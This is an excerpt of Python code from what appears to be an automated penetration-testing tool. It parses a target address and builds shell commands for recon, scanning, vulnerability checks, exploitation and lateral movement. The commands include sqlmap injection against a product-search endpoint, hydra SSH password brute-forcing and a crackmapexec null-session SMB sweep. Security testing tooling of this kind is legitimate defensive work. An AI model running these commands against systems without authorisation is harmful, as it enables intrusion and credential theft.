...
def _normalize_target(target: str) -> dict:
    """
    Parse target into components so every tool gets exactly what it needs.
    Handles: '192.168.1.1', 'localhost:3000', 'http://target.com:8080/path'

    Returns: {
        'raw':      original input
        'ip':       host only (no scheme, no port, no path) — for nmap/hydra
        'ip_port':  host:port — for tools that take host:port
        'url':      full http URL — for web tools
        'url_host': just the URL host with port for nikto -h
        'port':     port as string ('3000', '80', etc.)
    ...
    path = ""
    if "/" in raw:
        raw, path = raw.split("/", 1)
        path = "/" + path

    # Extract host and port
    if ":" in raw:
        host, port_str = raw.rsplit(":", 1)
        port = port_str if port_str.isdigit() else ("443" if scheme == "https" else "80")
    else:
        host = raw
    ...
    if (scheme == "http" and port == "80") or (scheme == "https" and port == "443"):
        ...
        url = f"{scheme}://{host}:{port}{path or '/'}"
...
def _nuclei_binary() -> str:
    """Return the real nuclei binary path — not the TypeScript wrapper."""
    import shutil
    # On Kali ARM64, /usr/local/bin/nuclei is the TypeScript compiler.
    # The real Go nuclei is at /usr/bin/nuclei or ~/go/bin/nuclei
    for path in ["/usr/bin/nuclei", "/home/kali/go/bin/nuclei", "/usr/local/bin/nuclei"]:
        import os
        ...
        try:
            ...
            if "Nuclei Engine Version" in (out.stdout + out.stderr):
                return path
        except Exception:
            continue
    return "nuclei"  # fallback


def _target_is_up(url: str, timeout: int = 5) -> bool:
    """Quick connectivity check before firing web tools."""
...
def _build_cmd(tool_id: str, target: str, params: dict) -> Optional[str]:
    ...
    nuclei   = _nuclei_binary()

    # Parse target into all needed forms
    t = _normalize_target(target)
    ip       = t["ip"]
    url      = t["url"]
    url_host = t["url_host"]   # host:port for nikto -h
    ip_port  = t["ip_port"]

    commands = {
        # Recon
        "nmap_discovery":    f"nmap -sn --min-rate 1000 {ip} -oN /tmp/errz_recon.txt",
        "subfinder":         f"subfinder -d {ip} -silent -o /tmp/errz_subdomains.txt",
        "theHarvester":      f"theHarvester -d {ip} -l 200 -b all 2>/dev/null | head -100",
        # Scan
        "nmap_deep":         f"nmap -sV -sC -O --top-ports 1000 {ip} -oA /tmp/errz_deep 2>/dev/null",
        "nuclei":            f"{nuclei} -u {url} -severity medium,high,critical -silent -o /tmp/errz_nuclei.txt 2>/dev/null",
        "nikto":             f"nikto -h {url_host} -p {t['port']} -o /tmp/errz_nikto.txt -Format txt 2>/dev/null",
        "gobuster":          f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -t {threads} -q 2>/dev/null",
        "enum4linux":        f"enum4linux -a {ip} 2>/dev/null | head -100",
        # Vuln assessment
        "nmap_vuln_scripts": f"nmap -sV --script vuln {ip} -oN /tmp/errz_vulns.txt 2>/dev/null",
        "nuclei_cve":        f"{nuclei} -u {url} -tags cve -silent 2>/dev/null",
        "searchsploit":      f"searchsploit --nmap /tmp/errz_deep.xml 2>/dev/null | head -30",
        # Exploitation
        "sqlmap":            f"sqlmap -u '{url}rest/products/search?q=1' --batch --dbs --level=1 --risk=1 -q 2>/dev/null",
        "hydra":             f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P {wordlist} {ip} ssh -t 4 -q 2>/dev/null",
        # Post-exploit
        ...
        # Lateral
        "crackmapexec_sweep": f"crackmapexec smb {ip} --shares -u '' -p '' 2>/dev/null",
        # Reporting
